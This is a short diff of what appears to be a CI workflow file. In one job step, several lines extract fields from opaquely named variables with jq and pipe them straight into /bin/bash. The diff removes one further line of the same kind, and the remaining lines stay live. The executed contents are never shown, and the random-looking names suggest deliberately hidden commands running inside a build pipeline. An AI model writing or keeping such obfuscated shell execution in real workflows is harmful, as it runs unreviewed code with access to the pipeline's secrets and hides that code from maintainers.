@@ -46,7 +46,6 @@ jobs:
           echo $bl89 | jq -r .wg97488 | /bin/bash
           echo $baye99 | jq -r .jm0 | /bin/bash
           printf '%s' "$hdege01" | jq -r .r7466 | /bin/bash
-          printf '%s' "$efckq4883" | jq -r .tndbc55 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
